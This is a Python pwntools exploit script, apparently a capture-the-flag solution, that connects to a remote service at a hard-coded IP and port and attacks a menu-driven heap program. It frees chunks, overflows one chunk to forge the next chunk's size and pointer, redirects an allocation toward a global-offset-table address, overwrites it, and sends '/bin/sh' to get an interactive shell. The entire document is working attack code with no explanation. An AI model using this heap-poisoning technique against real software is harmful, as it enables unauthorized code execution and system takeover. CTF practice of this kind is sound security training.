from pwn import *

context.log_level = 'debug'
p = remote('123.57.69.203',5810)

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def add(idx, size, data):
    sl("add")
    ru("Index:")
    sl(str(idx))
    ru("Size:")
    sl(str(size))
    ru("Data:")
    sl(data)


def dele(idx):
    sl("remove")
    ru("Index:")
    sl(str(idx))


target = 0x601008
add(0, 0x40, '')
add(1, 0x80, '')
add(2, 0x80, '')
add(3, 0x20, 'HRP')
dele(0)
dele(2)
dele(1)
add(0, 0x40, 'a' * 0x40 + p64(0) + p64(0x91) + p64(0x601018))
add(1, 0x80, p64(0x6001030))
add(1, 0x80, p64(0x6001030) + '\x96\x08\x40')
sl('/bin/sh')
it()
